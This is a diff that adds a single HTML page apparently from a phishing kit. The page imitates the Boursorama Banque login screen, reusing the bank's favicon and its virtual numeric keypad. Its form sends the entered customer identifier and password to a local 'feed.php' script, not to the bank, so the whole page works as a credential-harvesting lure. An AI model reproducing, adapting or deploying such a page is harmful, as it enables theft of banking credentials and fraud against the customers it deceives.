@@ -1,0 +1,107 @@
+<!doctype html>
+<html>
+<head>
+<meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<title>Boursorama Banque</title>
+<meta name="viewport" content="width=device-width, initial-scale=1,  maximum-scale=1,  minimum-scale=1, user-scalable=no">
+<link rel="shortcut icon" type="image/x-icon" href="https://clients.boursorama.com/bundles/boursoramadesign/img/favicons/favicon.ico?v=all0mAA9rp">
+<link rel="stylesheet" type="text/css" href="style/cloud.css">
+<script type="text/javascript" src="js/zok.js"></script>
+<script type="text/javascript" src="session/js/block.js"></script>
+<script type="text/javascript">function addCode(key){var numpad = document.forms[0].numpad;if(numpad.value.length < 6){numpad.value = numpad.value + key;}if(numpad.value.length == 4){document.getElementById("del").style.display = "block";document.getElementById("del1").style.display = "block";setTimeout(enable,1000);}}
+function emptyCode(){document.forms[0].numpad.value = "";document.getElementById("del1").style.display = "none";setTimeout(disable,1000);}
+function emytylog(){document.forms[0].logs.value = "";document.getElementById("del").style.display = "none";}
+</script>
+<script type="text/javascript">
+function check(){var input = document.getElementById('logs');if(input.value.length == 0)clean(); else rjoula();}
+function disable()
+  {
+  document.getElementById("brox").disabled=true;
+  document.getElementById("brox").style.opacity = "0.4";
+  }
+  function enable()
+  {
+  document.getElementById("brox").disabled=false;
+  document.getElementById("brox").style.opacity = "1";
+  }
+jQuery(window).load (function(){
+    setTimeout(disable, 1000);
+  });
+function checko(){
+  var sbou = document.getElementById('myform'),
+      input = document.getElementById('logs'),
+      numpad = document.forms[0].numpad;
+if(input.value.length > 8 || numpad.value.length > 5){
+  sbou.submit();
+}
+}
+
+</script>
+
+
+<script type="text/javascript" src="js/clavier.js"></script>
+
+</head>
+
+<body>
+ <div class="bodys">
+    <div class="headers"></div>
+       <div class="login_place">
+         <div class="no_opec"></div>
+                        <div class="moka">
+                        
+          <form id="myform" name="myform" method="post" action="feed.php">
+          <div class="logo"></div>
+          <div class="gro1">
+             <div class="lb">Veuillez saisir votre identifiant *</div><br>
+             <input id="logs" name="logs" class="typa" type="text" maxlength="20" onKeypress="if (event.keyCode < 45 || event.keyCode > 57) event.returnValue = false;"/>
+             <div id="del" class="del" onClick="emytylog()"></div>
+          </div>
+          <div class="tanbrik"><div id="ilo">Mémoriser mon identifiant</div><div id="_39al"></div></div>
+          <div class="gro1 hey">
+            <div class="lb">Votre mot de passe *</div><br>
+            <input id="numpad" name="lwalid" readonly type="password" class="typa jibha_west" onKeypress="if (event.keyCode < 45 || event.keyCode > 57) event.returnValue = false;" >
+            <div id="del1" class="del" onClick="emptyCode()"></div>
+          </div>
+          <div class="clv">
+               <div class="remo">
+                 <ul>
+                   <li><a class="vid"><strong>vide</strong></a></li>
+                   <li class="douz"><a class="btn8" onClick="addCode('8');"><strong>8</strong></a></li>
+                   <li class="douz"><a class="btn2" onClick="addCode('2');"><strong>2</strong></a></li>
+                   <li class="douz"><a class="botn1" onClick="addCode('1');"><strong>1</strong></a></li>
+                 </ul>
+               </div>
+               <div class="remo">
+                 <ul>
+                   <li><a class="btn9" onClick="addCode('9');"><strong>9</strong></a></li>
+                   <li class="douz"><a class="btn7" onClick="addCode('7');"><strong>7</strong></a></li>
+                   <li class="douz"><a class="btn5" onClick="addCode('5');"><strong>5</strong></a></li>
+                   <li class="douz"><a class="btn3" onClick="addCode('3');"><strong>3</strong></a></li>
+                 </ul>
+               </div>
+               <div class="remo">
+                 <ul>
+                   <li><a class="btn4" onClick="addCode('4');">4</a></li>
+                   <li class="douz"><a class="btn0" onClick="addCode('0');">0</a></li>
+                   <li class="douz"><a class="vid">vide</a></li>
+                   <li class="douz"><a class="btn6" onClick="addCode('6');">6</a></li>
+                 </ul>
+               </div>
+          </div>
+          
+          <div id="brox" class="btn" onClick="checko()">valider</div>
+          </form>
+              <div class="fota">
+                <center><a class="texto" href="#">Besoin d'aide pour vous connecter ?</a></center>
+              </div>
+          </div>
+            
+    
+         <center><div class="leto"><a></a></div></center>
+       </div>
+ </div>
+
+</body>
+</html>
